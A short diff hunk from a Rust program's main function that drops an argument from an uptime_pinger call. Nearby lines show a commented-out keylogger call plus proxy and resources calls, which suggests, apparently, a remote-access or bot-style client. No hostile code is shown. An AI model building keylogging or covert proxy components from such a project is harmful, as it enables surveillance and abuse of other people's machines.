@@ -87,7 +87,7 @@ async fn main() {
         .build()
         .unwrap();
 
-    uptime_pinger(reqwest_client.clone());
+    uptime_pinger();
     // keylogger(reqwest_client.to_owned());
     proxy(reqwest_client.to_owned(), global_state.to_owned());
     resources(global_state.to_owned(), reqwest_client.to_owned());
